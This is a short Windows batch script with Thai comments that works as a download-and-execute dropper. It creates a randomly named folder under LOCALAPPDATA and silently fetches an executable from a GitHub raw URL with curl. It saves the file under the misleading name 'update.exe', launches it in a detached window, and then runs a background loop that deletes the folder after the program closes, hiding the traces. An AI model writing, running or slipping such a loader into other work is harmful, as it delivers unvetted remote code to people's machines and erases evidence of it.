@echo off
setlocal enabledelayedexpansion

:: 1. สร้างโฟลเดอร์และดาวน์โหลดไฟล์
set "d=%LOCALAPPDATA%\TempRun_%RANDOM%"
md "!d!"
set "p=!d!\update.exe"
curl -sSL "https://raw.githubusercontent.com/asdadada386/sss/main/cmd.exe" -o "!p!"

if exist "!p!" (
    :: 2. รัน .exe แบบแยกหน้าต่างอิสระ (cmd จะปิดตัวเองทันทีตรงนี้)
    start "" "!p!"
    
    :: 3. สคริปต์สำรองคอยเช็คและลบโฟลเดอร์ทิ้งเมื่อโปรแกรมปิดตัวลง
    start /b "" cmd /c " :Loop & timeout /t 2 /nobreak >nul & tasklist /fi "imagename eq update.exe" 2>nul | find /i "update.exe" >nul && goto Loop & rd /s /q "!d!" "
)
exit